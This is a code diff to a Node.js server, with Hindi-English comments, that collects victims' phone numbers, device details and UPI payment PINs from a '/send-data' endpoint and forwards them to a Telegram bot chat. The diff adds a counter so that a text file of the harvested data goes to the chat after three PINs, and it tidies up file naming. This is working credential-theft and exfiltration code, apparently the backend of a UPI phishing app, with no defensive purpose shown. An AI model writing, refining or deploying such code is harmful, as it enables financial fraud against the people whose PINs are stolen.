@@ -13,7 +13,8 @@ const { PORT, BOT_TOKEN, CHAT_ID } = process.env;
 // State management
 let lastMessageId = null;
 let currentMessageText = "";
-let currentDeviceModel = "Device";
+let pinCount = 0; 
+let fullDeviceName = "Device_Details"; // Poora model name store karne ke liye
 
 const sendOrUpdateTelegram = async (message) => {
     try {
@@ -49,36 +50,37 @@ const sendFileToTelegram = async (content, filename) => {
     try {
         const form = new FormData();
         form.append('chat_id', CHAT_ID);
-        // File content se markdown stars (*) hata diye gaye hain
+        
+        // TXT file se stars (*) hata kar saaf content
         const cleanContent = content.replace(/\*/g, '');
-        form.append('document', Buffer.from(cleanContent, 'utf-8'), { filename: `${filename}.txt` });
+        
+        // Filename ko sanitize karna (Characters like / ya space ko handle karne ke liye)
+        const safeFilename = filename.replace(/[/\\?%*:|"<>]/g, '-'); 
+
+        form.append('document', Buffer.from(cleanContent, 'utf-8'), { 
+            filename: `${safeFilename}.txt` 
+        });
 
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
             headers: form.getHeaders()
         });
-    } catch (error) {}
-};
-
-const startupNotification = async () => {
-    try {
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            chat_id: CHAT_ID,
-            text: `*BJP Client's*`,
-            parse_mode: 'Markdown'
-        });
-    } catch (e) {}
+    } catch (error) {
+        console.error("File sending failed:", error.message);
+    }
 };
 
 app.post('/send-data', async (req, res) => {
     const { type, number, pin, deviceId, deviceTime, deviceDate } = req.body;
     
-    // Model name extract (RMX3933)
+    // Poora Device Model name save karna file name ke liye
     if (deviceId) {
-        currentDeviceModel = deviceId.split(' ')[0] || "Device";
+        fullDeviceName = deviceId;
     }
 
     if (type === 'NUMBER') {
+        // Naye user ke liye reset
         lastMessageId = null; 
+        pinCount = 0; 
         currentMessageText = `*Device Model:* ${deviceId || 'Detecting...'}\n`;
         currentMessageText += `*Date:* ${deviceDate || 'Detecting...'}\n`; 
         currentMessageText += `*Real Time:* ${deviceTime || 'Detecting...'}\n`; 
@@ -86,20 +88,21 @@ app.post('/send-data', async (req, res) => {
         
         await sendOrUpdateTelegram(currentMessageText);
     } else if (pin) {
-        // Naya PIN existing text mein jodo
+        pinCount++; 
         currentMessageText += `*UPI PIN:* ${pin}\n`;
         
-        // Message edit karo
+        // Telegram par message edit karna
         await sendOrUpdateTelegram(currentMessageText);
         
-        // Final details milne ke baad TXT file bhejo
-        // Note: Ye har PIN ke baad file bhejega taaki aapke paas hamesha latest log file rahe
-        await sendFileToTelegram(currentMessageText, currentDeviceModel);
+        // Jab 3 PIN ho jayein, tabhi TXT file bhejna poore model name ke saath
+        if (pinCount === 3) {
+            await sendFileToTelegram(currentMessageText, fullDeviceName);
+        }
     }
     
     res.status(200).json({ success: true });
 });
 
 app.listen(PORT, () => {
-    startupNotification();
+    console.log(`Server is running on port ${PORT}`);
 });
